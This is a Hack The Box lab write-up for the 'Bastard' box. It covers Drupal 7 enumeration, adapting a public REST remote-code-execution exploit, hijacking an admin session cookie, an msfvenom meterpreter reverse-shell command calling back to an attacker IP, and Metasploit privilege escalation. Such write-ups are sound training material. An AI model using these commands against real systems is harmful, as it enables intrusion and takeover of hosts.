---
layout: post
title: HTB - Bastard Writeup
date: 2019-11-11
image: '/images/posts/htb/bastard/bastard.jpg'
categories: ["writeups"]
tags: ["writeups", "bastard", "htb"]
---

* Box: Bastard
  - Difficulty: Medium
  - Points: 30
  - Release: 18 Mar 2017
  - IP: 10.10.10.9


### Initial Enumeration

#### 1. Nmap Scanning

Starting with a scan of the target ip address:

`nmap -sC -sV -oA bastard.nmap 10.10.10.9`

<img src="/images/posts/htb/bastard/bastard1.jpg">

The nmap reveals an IIS server as well as Windows RPC.

Loading up the website we see that the IIS server is running Drupal:

<img src="/images/posts/htb/bastard/bastard2.jpg">

We can find the Drupal version by browsing to ``10.10.10.9/CHANGELOG.txt``

<img src="/images/posts/htb/bastard/bastard3.jpg">

In the meantime, we will run a gobuster scan to find any more directories:

#### 2. Gobuster Scanning

```
gobuster dir -u http://10.10.10.9/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -k
```

We see a directory called `/rest` which will come in handy for the next step:


### Exploitation

Searching for exploits, we see the following in our searchsploit command: [Exploit-DB 41564](https://www.exploit-db.com/exploits/41564/)

<img src="/images/posts/htb/bastard/bastard4.jpg">

This will exploit a remote code execution vulnerability in Drupal 7.x. We'll need to modify the code bit for it to run successfully.

Basically, this will attack the REST endpoint created by the services extension. Because we have the pre-made script already, we just ened to find out the name of the REST endpoint. As previously mentioned, our gobuster scan found the `/rest` directory.

We will need to modify our exploit.
The exploit needs rest api path which we found in our directory enumeration so we set our endpoint path to /rest.

```
$url = 'http://10.10.10.9';                                                     
$endpoint_path = '/rest';
```

By running this exploit we got two files user.json and session.json.

We can use sessions.txt data to login as administrator which we got through running exploit.

sessions.txt
```
{
    "session_name": "SESSd873f26fc11f2b7e6e4aa0f6fce59913",
    "session_id": "li1-xoDBXCgxKg0rI9tn3pS6CsfJaQKwEjARmfxlxa0",
    "token": "2dnjgeee6Cy5hRPikPeogGjbxqqgdKeyEo2v32d-jEU"
}
```


Now let’s go to http://10.10.10.9/admin

<img src="/images/posts/htb/bastard/bastard5.jpg">

`Cookie: has_js=1; Drupal.toolbar.collapsed=0``

<img src="/images/posts/htb/bastard/bastard6.jpg">


We have to modify the cookie in this format.
```
Cookie: session_name=session_id;token
```

<img src="/images/posts/htb/bastard/bastard7.jpg">

Once you have access to administration panel go to Modules and enable PHP filter so we can get reverse shell.

<img src="/images/posts/htb/bastard/bastard8.jpg">


## Privilege Escalation

Now we have user access we have to use exploit suggester module in order to obtain more information regarding the box.

We have a user session via php shell let’s switch to actual reverse shell.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.24 LPORT=1338 -f exe > shell.exe
```

<img src="/images/posts/htb/bastard/bastard9.jpg">

By using exploit suggester we got few exploits which i tested and one of them worked.

```
use exploit/windows/local/ms15_051_client_copy_image
```
<img src="/images/posts/htb/bastard/bastard10.jpg">

And now we are NT Authority.

<img src="/images/posts/htb/bastard/bastard11.jpg">

The root flag is located:
**C:\Users\Administrator\Desktop\root.txt**

User flag is:
**C:\Users\dimitris\Desktop\user.txt**
